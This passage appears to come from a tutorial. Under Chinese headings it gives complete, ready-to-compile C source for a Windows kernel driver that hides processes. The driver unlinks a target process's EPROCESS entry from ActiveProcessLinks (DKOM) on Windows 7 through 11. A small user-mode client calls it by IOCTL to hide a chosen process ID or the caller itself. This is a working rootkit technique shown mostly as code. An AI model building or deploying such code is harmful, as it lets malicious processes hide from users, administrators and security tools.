## 二、驱动代码（单文件，可直接编）

`hideproc.c`：

```c
/* =====================================================================
 * hideproc.c -- DKOM: unlink EPROCESS->ActiveProcessLinks on x64
 * target: Win7 SP1 .. Win11 22H2, WDK 10
 * ===================================================================== */
#include <ntifs.h>

#define TAG_HIDE      'pdiH'
#define CHAIN_LIMIT   0x8000

#define IOCTL_HIDE_PID    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNHIDE_PID  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DUMP_CHAIN  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _HIDE_REC {
    LIST_ENTRY Linkage;
    PEPROCESS  Process;      /* 持引用，防止 EPROCESS 被释放 */
    ULONG_PTR  Pid;
    ULONG_PTR  Links;        /* &EPROCESS->ActiveProcessLinks */
    ULONG_PTR  SavedFlink;
    ULONG_PTR  SavedBlink;
} HIDE_REC, *PHIDE_REC;

static LIST_ENTRY      g_Recs;
static FAST_MUTEX      g_Mutex;
static ULONG           g_LinksOff;   /* 缓存，per-build 常量 */
static ULONG           g_PidOff;
static PDEVICE_OBJECT  g_Device;

/* ---------------- helpers ---------------- */

static __forceinline BOOLEAN IsKernelPtr(ULONG_PTR v)
{
    return (v >= 0xFFFF800000000000ULL) && MmIsAddressValid((PVOID)v);
}

/* 从 start 沿 Flink 走，看是否命中 want */
static BOOLEAN ChainContains(ULONG_PTR start, ULONG_PTR want)
{
    ULONG_PTR cur = start;
    for (ULONG i = 0; i < CHAIN_LIMIT; i++) {
        if (cur == want) return TRUE;
        if (!IsKernelPtr(cur)) return FALSE;
        cur = *(ULONG_PTR *)cur;
    }
    return FALSE;
}

/* 扫 EPROCESS，解出 ActiveProcessLinks 偏移。
 * Process 不能是 PsInitialSystemProcess（锚点会退化）。 */
static ULONG ResolveLinksOffset(PEPROCESS Process)
{
    PUCHAR    base = (PUCHAR)Process;
    ULONG_PTR sys  = (ULONG_PTR)PsInitialSystemProcess;

    for (ULONG off = 0x100; off <= 0xC00; off += sizeof(ULONG_PTR)) {
        ULONG_PTR L = (ULONG_PTR)(base + off);
        ULONG_PTR F = *(ULONG_PTR *)L;
        ULONG_PTR B = *(ULONG_PTR *)(L + 8);

        if (F == 0 || B == 0)              continue;
        if (F & 7 || B & 7)                continue;
        if (!IsKernelPtr(F) || !IsKernelPtr(B)) continue;
        if (*(ULONG_PTR *)(F + 8) != L)    continue;   /* F->Blink == L */
        if (*(ULONG_PTR *)B       != L)    continue;   /* B->Flink == L */
        if (!ChainContains(F, sys + off))  continue;   /* 链里必须有 System */

        return off;
    }
    return 0;
}

/* 解 UniqueProcessId 偏移：扫一个宽度小、值唯一的字段 */
static ULONG ResolvePidOffset(PEPROCESS Process, ULONG_PTR Pid)
{
    PUCHAR base = (PUCHAR)Process;
    for (ULONG off = 0x100; off <= 0x700; off += sizeof(ULONG_PTR))
        if (*(ULONG_PTR *)(base + off) == Pid) return off;
    return 0;
}

/* 从 System 节点遍历全链，确认 pid 在不在 */
static BOOLEAN ChainHasPid(ULONG_PTR Pid)
{
    if (!g_LinksOff || !g_PidOff) return FALSE;

    ULONG_PTR sys  = (ULONG_PTR)PsInitialSystemProcess;
    ULONG_PTR cur  = sys + g_LinksOff;

    for (ULONG i = 0; i < CHAIN_LIMIT; i++) {
        ULONG_PTR ep  = cur - g_LinksOff;
        ULONG_PTR pid = *(ULONG_PTR *)(ep + g_PidOff);
        if (pid == Pid) return TRUE;
        if (!IsKernelPtr(cur)) break;
        cur = *(ULONG_PTR *)cur;
        if (cur == sys + g_LinksOff) break;
    }
    return FALSE;
}

/* ---------------- 核心：摘链 / 复链 ---------------- */

static NTSTATUS DoUnlink(PEPROCESS Process, PHIDE_REC Rec)
{
    ULONG_PTR L = (ULONG_PTR)Process + g_LinksOff;
    ULONG_PTR F = *(ULONG_PTR *)L;
    ULONG_PTR B = *(ULONG_PTR *)(L + 8);

    if (F == L && B == L) return STATUS_ALREADY_DISCONNECTED;   /* 已摘过 */

    /* 摘之前再验一次邻居，防止 list 在窗口内被改 */
    if (!IsKernelPtr(F) || !IsKernelPtr(B)) return STATUS_INVALID_PARAMETER;
    if (*(ULONG_PTR *)(F + 8) != L || *(ULONG_PTR *)B != L) return STATUS_DATA_ERROR;

    Rec->Links = L; Rec->SavedFlink = F; Rec->SavedBlink = B;

    /* step 4: 先改邻居 */
    *(ULONG_PTR *)(F + 8) = B;      /* next->Blink = prev */
    *(ULONG_PTR *)B       = F;      /* prev->Flink = next */
    /* step 5: 再自环，退出安全 */
    *(ULONG_PTR *)L       = L;
    *(ULONG_PTR *)(L + 8) = L;

    return STATUS_SUCCESS;
}

/* 把节点重新插回原位置。只有邻居仍然互相指向时才做。 */
static VOID DoRelink(PHIDE_REC Rec)
{
    ULONG_PTR L = Rec->Links, F = Rec->SavedFlink, B = Rec->SavedBlink;

    if (!L || !IsKernelPtr(L)) return;
    if (*(ULONG_PTR *)L != L) return;              /* 已经被别人接回去了 */

    if (!IsKernelPtr(F) || !IsKernelPtr(B)) return;
    /* 邻居必须仍是摘链后的状态：prev->Flink == next && next->Blink == prev */
    if (*(ULONG_PTR *)B != F || *(ULONG_PTR *)(F + 8) != B) return;

    /* 先把自己写一致，再 splice，避免 walker 看到半成品 */
    *(ULONG_PTR *)L       = F;
    *(ULONG_PTR *)(L + 8) = B;
    *(ULONG_PTR *)B       = L;      /* prev->Flink = L */
    *(ULONG_PTR *)(F + 8) = L;      /* next->Blink = L */
}

static NTSTATUS HidePid(ULONG_PTR Pid)
{
    PEPROCESS p  = NULL;
    NTSTATUS  st = PsLookupProcessByProcessId((HANDLE)Pid, &p);
    if (!NT_SUCCESS(st)) return st;

    if (p == PsInitialSystemProcess || Pid == 0 || Pid == 4) {
        ObDereferenceObject(p);
        return STATUS_ACCESS_DENIED;      /* 动 System 会立刻炸 */
    }

    ExAcquireFastMutex(&g_Mutex);

    if (!g_LinksOff) g_LinksOff = ResolveLinksOffset(p);
    if (!g_PidOff)   g_PidOff   = ResolvePidOffset(PsInitialSystemProcess, 4);

    if (!g_LinksOff) {
        ExReleaseFastMutex(&g_Mutex);
        ObDereferenceObject(p);
        return STATUS_PROCEDURE_NOT_FOUND;
    }

    PHIDE_REC rec = (PHIDE_REC)ExAllocatePoolWithTag(NonPagedPool, sizeof(*rec), TAG_HIDE);
    if (!rec) {
        ExReleaseFastMutex(&g_Mutex);
        ObDereferenceObject(p);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory(rec, sizeof(*rec));

    st = DoUnlink(p, rec);
    if (NT_SUCCESS(st)) {
        rec->Process = p;            /* 引用转移给 rec */
        rec->Pid     = Pid;
        InsertTailList(&g_Recs, &rec->Linkage);
        DbgPrint("[hideproc] unlinked pid %llu  off=0x%X  L=%p\n",
                 (unsigned long long)Pid, g_LinksOff, (PVOID)rec->Links);
    } else {
        ExFreePoolWithTag(rec, TAG_HIDE);
        ObDereferenceObject(p);
    }

    ExReleaseFastMutex(&g_Mutex);
    return st;
}

static NTSTATUS UnhidePid(ULONG_PTR Pid)
{
    NTSTATUS st = STATUS_NOT_FOUND;

    ExAcquireFastMutex(&g_Mutex);
    for (PLIST_ENTRY e = g_Recs.Flink; e != &g_Recs; e = e->Flink) {
        PHIDE_REC rec = CONTAINING_RECORD(e, HIDE_REC, Linkage);
        if (rec->Pid != Pid) continue;
        DoRelink(rec);
        RemoveEntryList(&rec->Linkage);
        if (rec->Process) ObDereferenceObject(rec->Process);
        ExFreePoolWithTag(rec, TAG_HIDE);
        st = STATUS_SUCCESS;
        break;
    }
    ExReleaseFastMutex(&g_Mutex);
    return st;
}

/* ---------------- dispatch ---------------- */

static NTSTATUS DispatchControl(PDEVICE_OBJECT Dev, PIRP Irp)
{
    UNREFERENCED_PARAMETER(Dev);

    PIO_STACK_LOCATION sp  = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS           st  = STATUS_INVALID_DEVICE_REQUEST;
    ULONG              len = sp->Parameters.DeviceIoControl.InputBufferLength;
    ULONG_PTR          pid = 0;

    if (len >= sizeof(ULONG) && Irp->AssociatedIrp.SystemBuffer)
        pid = *(ULONG *)Irp->AssociatedIrp.SystemBuffer;

    switch (sp->Parameters.DeviceIoControl.IoControlCode) {

    case IOCTL_HIDE_PID:                   /* pid==0 -> 隐藏调用者自己 */
        st = HidePid(pid ? pid : (ULONG_PTR)PsGetCurrentProcessId());
        break;

    case IOCTL_UNHIDE_PID:
        st = UnhidePid(pid);
        break;

    case IOCTL_DUMP_CHAIN:
        DbgPrint("[hideproc] linksOff=0x%X pidOff=0x%X\n", g_LinksOff, g_PidOff);
        if (pid && g_LinksOff && g_PidOff)
            DbgPrint("[hideproc] pid %llu in ActiveProcessLinks: %s\n",
                     (unsigned long long)pid, ChainHasPid(pid) ? "YES" : "NO");
        st = STATUS_SUCCESS;
        break;
    }

    Irp->IoStatus.Status      = st;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return st;
}

static NTSTATUS DispatchPass(PDEVICE_OBJECT Dev, PIRP Irp)
{
    UNREFERENCED_PARAMETER(Dev);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static VOID DriverUnload(PDRIVER_OBJECT Drv)
{
    UNREFERENCED_PARAMETER(Drv);

    /* 复链所有还活着的，否则进程永久隐身直到重启 */
    ExAcquireFastMutex(&g_Mutex);
    while (g_Recs.Flink != &g_Recs) {
        PHIDE_REC rec = CONTAINING_RECORD(g_Recs.Flink, HIDE_REC, Linkage);
        DoRelink(rec);
        RemoveEntryList(&rec->Linkage);
        if (rec->Process) ObDereferenceObject(rec->Process);
        ExFreePoolWithTag(rec, TAG_HIDE);
    }
    ExReleaseFastMutex(&g_Mutex);

    UNICODE_STRING link;
    RtlInitUnicodeString(&link, L"\\??\\HideProc");
    IoDeleteSymbolicLink(&link);
    if (g_Device) IoDeleteDevice(g_Device);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT Drv, PUNICODE_STRING RegPath)
{
    UNREFERENCED_PARAMETER(RegPath);

    InitializeListHead(&g_Recs);
    ExInitializeFastMutex(&g_Mutex);

    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"\\Device\\HideProc");

    NTSTATUS st = IoCreateDevice(Drv, 0, &name, FILE_DEVICE_UNKNOWN,
                                 FILE_DEVICE_SECURE_OPEN, FALSE, &g_Device);
    if (!NT_SUCCESS(st)) return st;

    UNICODE_STRING link;
    RtlInitUnicodeString(&link, L"\\??\\HideProc");
    st = IoCreateSymbolicLink(&link, &name);
    if (!NT_SUCCESS(st)) { IoDeleteDevice(g_Device); return st; }

    Drv->MajorFunction[IRP_MJ_CREATE]         = DispatchPass;
    Drv->MajorFunction[IRP_MJ_CLOSE]          = DispatchPass;
    Drv->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;
    Drv->DriverUnload                         = DriverUnload;

    DbgPrint("[hideproc] loaded\n");
    return STATUS_SUCCESS;
}
```

## 三、用户态客户端

`client.c`：

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define IOCTL_HIDE_PID   0x222000   /* CTL_CODE(0x22,0x800,METHOD_BUFFERED,ANY) */
#define IOCTL_UNHIDE_PID 0x222004
#define IOCTL_DUMP_CHAIN 0x222008

int main(int argc, char **argv)
{
    HANDLE h = CreateFileA("\\\\.\\HideProc", GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) { printf("open failed %lu\n", GetLastError()); return 1; }

    DWORD pid = (argc > 1) ? (DWORD)strtoul(argv[1], NULL, 0) : 0;  /* 0 = 自己 */
    DWORD code = IOCTL_HIDE_PID;
    if (argc > 2 && argv[2][0] == 'u') code = IOCTL_UNHIDE_PID;
    if (argc > 2 && argv[2][0] == 'd') code = IOCTL_DUMP_CHAIN;

    DWORD ret = 0;
    BOOL ok = DeviceIoControl(h, code, &pid, sizeof(pid), NULL, 0, &ret, NULL);
    printf("ioctl=0x%X pid=%lu ok=%d err=%lu\n", code, pid, ok, GetLastError());
    CloseHandle(h);
    return ok ? 0 : 1;
}
```

